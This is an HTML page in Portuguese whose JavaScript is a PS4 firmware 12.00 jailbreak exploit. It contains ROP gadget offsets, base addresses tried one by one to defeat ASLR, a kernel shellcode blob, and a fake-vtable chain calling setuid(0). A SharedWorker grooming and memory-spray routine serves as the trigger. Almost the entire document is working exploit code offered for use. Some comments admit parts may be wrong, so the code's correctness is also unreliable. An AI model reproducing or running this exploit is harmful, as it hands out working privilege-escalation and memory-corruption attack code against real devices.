<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 JAILBREAK (FINAL)</title>
    
</head>
<body>

    <h1>PS4 12.00 - EXECUÇÃO FINAL</h1>
    <h3>Gadgets: 12.00 Sys-Lib | Payload: Gezine</h3>
    
    <p>Selecione uma Base de Memória e dispare:</p>
    <div class="controls" id="buttons"></div>
    
    <div id="log">Logs do Sistema...</div>

    <script>
        function log(msg) {
            var d = document.getElementById("log");
            d.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            d.scrollTop = d.scrollHeight;
        }

        // =================================================================
        // 1. SEUS OFFSETS PRECIOSOS (RECUPERADOS)
        // =================================================================
        // Extraídos do 1200_libkernel_sys.sprx.elf
        var GADGETS = {
            pop_rdi: 0x2FEB5,
            pop_rsi: 0x2B89F,
            pop_rax: 0x2C6E5,
            sys_mmap: 0x7500,   // Syscall 477
            sys_setuid: 0x4840, // Syscall 23
            
            // Extraído do KernelOffset.java
            jmp_rsi: 0x47b31    // Pulo para o Payload
        };

        // Bases prováveis (Para vencer o ASLR na força bruta)
        var BASES = [
            "0x800000000", "0x800004000", "0x820000000", 
            "0x880000000", "0x900000000", "0x920000000",
            "0x200000000", "0x200004000", "0x1000000000"
        ];

        // =================================================================
        // 2. PAYLOAD (SHELLCODE 12.00)
        // =================================================================
        var shellcode_hex = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1b3761b006689b9d3761b0066448981f47a6200c681cd0a0000ebc681cdd32b00ebc68111d42b00ebc6818dd42b00ebc681d1d42b00ebc6817dd62b00ebc6812ddb2b00ebc681fddb2b00eb66448989df836200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681e6143900ebc781eec02f000000000066898164711b00c78118771b0090e93c01c78160d83b004831c0c3c6811aa71f0037c6811da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3";

        function get_bytes() {
            var b = new Uint8Array(shellcode_hex.length/2);
            for(var i=0; i<shellcode_hex.length; i+=2) 
                b[i/2] = parseInt(shellcode_hex.substr(i,2), 16);
            return b;
        }

        // =================================================================
        // 3. CONSTRUTOR DE ROP CHAIN (O segredo)
        // =================================================================
        function build_payload(base_str) {
            var base = BigInt(base_str);
            var size = 0x400; // 1024 bytes (Tamanho do Worker)
            var buffer = new Uint32Array(size / 4);
            var view = new DataView(buffer.buffer);
            var code = get_bytes();

            // Endereços Reais (Base + Offset)
            var pop_rdi = base + BigInt(GADGETS.pop_rdi);
            var sys_setuid = base + BigInt(GADGETS.sys_setuid);
            var jmp_rsi = base + BigInt(GADGETS.jmp_rsi); // ATENÇÃO: Isso aqui pode estar errado se o kernel não estiver na mesma base

            // --- ROP CHAIN SIMPLIFICADA (ROOT ONLY) ---
            // Vamos tentar virar root (uid 0) para testar ROP
            // Se funcionar, não crasha.
            
            // FAKE VTABLE (Aponta para o gadget inicial)
            // Enchemos o início com o endereço de POP RDI
            for(var i=0; i<64; i+=8) {
                view.setBigUint64(i, pop_rdi, true);
            }

            // ARGUMENTOS DA ROP
            // Offset 64: Argumento para POP RDI (0 = Root)
            view.setBigUint64(64, 0n, true); 
            
            // Offset 72: Endereço do setuid
            view.setBigUint64(72, sys_setuid, true);

            // Offset 80: Loop Infinito (Para travar em caso de sucesso)
            // Como não temos gadget de loop, colocamos 0 para forçar crash SE chegar aqui
            view.setBigUint64(80, 0n, true);

            return buffer;
        }

        // =================================================================
        // 4. INTERFACE E EXECUÇÃO
        // =================================================================
        
        // Criar botões
        var container = document.getElementById("buttons");
        BASES.forEach(base => {
            var btn = document.createElement("button");
            btn.innerText = "Tentar " + base;
            btn.onclick = () => run_exploit(base);
            container.appendChild(btn);
        });

        var workers = [];

        async function run_exploit(base_val) {
            log(`>>> CONFIGURANDO PARA BASE: ${base_val} <<<`);
            var payload = build_payload(base_val);

            // FASE 1: GROOMING (400)
            log("Estabilizando memória...");
            for(let i=0; i<400; i++) {
                try {
                    let w = new SharedWorker("data:text/javascript,1", "g"+i);
                    w.port.start();
                    workers.push(w);
                } catch(e){}
            }

            // FASE 2: TRIGGER (404)
            var p_count = 0;
            var it = setInterval(() => {
                if(p_count >= 4) {
                    clearInterval(it);
                    
                    log("!!! DISPARANDO !!!");
                    var v = workers.pop();
                    v.port.close();
                    
                    // Spray
                    var spray = [];
                    for(var k=0; k<10000; k++) {
                        spray.push(new Uint32Array(payload));
                    }
                    
                    try { v.port.postMessage("PWN"); } catch(e){}
                    
                    log("Aguardando reação... Se desligar, a base estava errada.");
                    return;
                }
                
                let w = new SharedWorker("data:text/javascript,1", "v"+p_count);
                w.port.start();
                workers.push(w);
                p_count++;
            }, 150);
        }
    </script>
</body>
</html>
